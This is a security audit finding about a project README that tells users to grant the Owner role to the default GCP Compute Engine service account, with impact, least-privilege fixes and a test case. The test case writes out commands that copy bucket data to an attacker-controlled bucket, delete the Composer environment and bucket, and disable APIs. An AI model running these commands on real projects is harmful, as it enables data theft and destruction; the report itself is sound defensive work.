- Vulnerability Name: Overly Permissive Default Compute Service Account Permissions
- Description:
  - The project's `README.md` provides instructions to grant the 'Owner' role to the default Compute Engine service account.
  - An attacker could potentially compromise the default Compute Engine service account through various means (e.g., exploiting a vulnerability in a service running on Compute Engine instances using this service account).
  - Once the Compute Engine service account is compromised, the attacker inherits the 'Owner' permissions granted to it.
- Impact:
  - **Critical**. Granting the 'Owner' role to the default Compute Engine service account provides an attacker with full control over the GCP project.
  - This includes the ability to:
    - Access and modify all data stored within the project (including sensitive data in GCS Buckets, BigQuery datasets, Datastore, etc.).
    - Modify or delete project resources (Cloud Composer environments, Dataflow jobs, AutoML models, Compute Engine instances, etc.).
    - Create new resources within the project.
    - Grant or revoke IAM permissions to other users or service accounts, potentially escalating privileges further or establishing persistence.
    - Pivot to other GCP projects or on-premises systems if proper network configurations are not in place.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
  - None. The project provides no mitigations for this vulnerability. The `README.md` directly instructs users to grant the overly permissive 'Owner' role.
- Missing Mitigations:
  - **Least Privilege IAM Guidance:** The `README.md` should be updated to strongly discourage granting the 'Owner' role to the default Compute Engine service account.
  - **Specific Role Recommendations:**  Instead of 'Owner', the documentation should guide users to identify and grant the minimum necessary IAM roles required for the project to function. This might involve roles like:
    - `roles/dataflow.developer` for Dataflow operations.
    - `roles/composer.worker` and `roles/composer.admin` for Cloud Composer operations.
    - `roles/automl.serviceAgent` and potentially more granular BigQuery roles for AutoML.
    - `roles/storage.objectAdmin` for GCS bucket access.
    - `roles/bigquery.dataEditor` and `roles/bigquery.jobUser` for BigQuery access.
  - **IAM Role Separation:** Encourage users to create dedicated service accounts with specific roles for each component of the ML pipeline (Dataflow, Composer, AutoML) instead of relying on the default Compute Engine service account.
- Preconditions:
  - The user must follow the "Grant service account permissions" instructions in the `README.md` and execute the command:
    ```bash
    gcloud projects add-iam-policy-binding $GCP_PROJECT_ID \
      --member="serviceAccount:${GCP_PROJECT_NUMBER}-compute@developer.gserviceaccount.com" \
      --role='roles/owner'
    ```
  - The default Compute Engine service account must be compromised by an attacker.
- Source Code Analysis:
  - The vulnerability is not present in the Python code or configuration scripts of the project.
  - The vulnerability is solely due to the **insecure IAM configuration instruction** provided in the `README.md` file:
  ```
  File: /code/README.md
  Content:
  ...
  ### Grant service account permissions

  - Grant Owner permissions to the default compute service account:

    ```bash
      gcloud projects add-iam-policy-binding $GCP_PROJECT_ID \
        --member="serviceAccount:${GCP_PROJECT_NUMBER}-compute@developer.gserviceaccount.com" \
        --role='roles/owner'
    ```
  ...
  ```
  - This instruction directly leads users to grant the 'Owner' role, which is excessively permissive and violates the principle of least privilege.
- Security Test Case:
  - **Step 1: Setup the Blockbuster project as described in `README.md`**. This includes enabling APIs, setting up the environment, creating a Cloud Composer environment, and crucially, granting 'Owner' permissions to the default Compute Engine service account as instructed.
  - **Step 2: Simulate Compute Engine Service Account Compromise**. In a real-world scenario, this could involve various attack vectors. For this test case, we can simulate it by gaining access to a Compute Engine instance running under the default service account.  This could be achieved by:
    - Creating a Compute Engine instance in the project.
    - Ensuring the instance runs as the default Compute Engine service account (no service account specified during instance creation).
    - Gaining SSH access to this instance (e.g., through misconfigured firewall rules or compromised credentials - though for the purpose of *demonstrating the impact* of the IAM misconfiguration, we can assume we have gained shell access).
  - **Step 3: Exploit 'Owner' Permissions**. Once inside the Compute Engine instance, the attacker (simulating the compromised service account) can use the `gcloud` command-line tool, which will automatically authenticate using the instance's service account credentials.
    - **Example Data Exfiltration:**
      ```bash
      # List all GCS buckets in the project
      gsutil ls

      # Copy sensitive data from a bucket to an attacker-controlled location
      gsutil cp gs://your-gcp-bucket/sensitive-data.txt gs://attacker-bucket/exfiltrated-data.txt

      # Access BigQuery data
      bq query --nouse_legacy_sql 'SELECT * FROM `your-gcp-project:your_dataset.your_table` LIMIT 10'

      # Create a new Compute Engine instance under attacker control
      gcloud compute instances create attacker-instance --zone us-central1-a
      ```
    - **Example Resource Manipulation/Denial of Service:**
      ```bash
      # Delete the Cloud Composer environment
      gcloud composer environments delete $GCP_COMPOSER_ENV_NAME --location $GCP_REGION --quiet

      # Delete the GCS bucket
      gsutil rm -r gs://$GCP_BUCKET

      # Disable APIs
      gcloud services disable dataflow.googleapis.com composer.googleapis.com automl.googleapis.com datastore.googleapis.com
      ```
  - **Step 4: Observe Impact**. The attacker can successfully perform all the actions in Step 3, demonstrating the complete compromise of the GCP project due to the overly permissive 'Owner' role granted to the default Compute Engine service account. This proves the vulnerability.